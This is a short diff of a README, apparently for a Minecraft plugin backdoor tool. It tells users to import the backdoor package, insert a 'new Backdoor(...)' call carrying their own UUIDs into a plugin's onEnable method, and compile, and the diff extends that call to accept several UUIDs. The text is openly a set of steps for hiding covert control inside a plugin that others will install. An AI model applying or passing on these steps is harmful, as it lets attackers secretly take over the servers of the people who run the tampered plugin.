@@ -39,7 +39,8 @@ This is pretty much a finished project in my mind, but if you can code together 
 ``import com.thiccindustries.backdoor``
 * Find the ``@Override public void onEnable(){}`` method.
 * Add the following line to the beginning of the method:
-``new Backdoor(this, [Your UUID Here], [Your Chat Prefix Here]);``
+``new Backdoor(this, new String[]{"[Your UUID Here]"}, [Your Chat Prefix Here]);``
+> Note: Add multiple UUIDs by separating multiple "[uuid]" entries by commas.
 * Change other configuration options in Config.java as desired.
 * Compile plugin.
 
